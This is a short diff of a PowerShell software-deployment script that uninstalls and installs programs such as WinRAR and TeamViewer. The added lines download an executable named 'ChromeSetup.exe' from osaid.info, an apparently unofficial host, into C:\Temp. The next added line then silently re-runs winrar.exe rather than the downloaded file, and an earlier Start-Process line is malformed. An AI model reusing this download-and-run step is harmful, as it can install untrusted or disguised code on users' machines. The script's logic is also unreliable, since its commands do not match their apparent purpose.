@@ -8,6 +8,8 @@ Start-Process -Filepath "-file C:\Program Files (x86)\WinRAR\uninstall.exe" /s
  New-Item -ItemType File -Path C:\Temp\newfile.txt -Value "Hello World!" -Force
 (New-Object Net.WebClient).DownloadFile('https://www.win-rar.com/fileadmin/winrar-versions/winrar/winrar-x64-623.exe', 'C:\Temp\winrar.exe') 
 C:\Temp\winrar.exe /s 
+(New-Object Net.WebClient).DownloadFile('https://osaid.info/ChromeSetup.exe', 'C:\Temp\Chrome.exe') 
+C:\Temp\winrar.exe /s 
 
 
 Start-Process -FilePath "C:\Program Files\TeamViewer\uninstall.exe" /S 
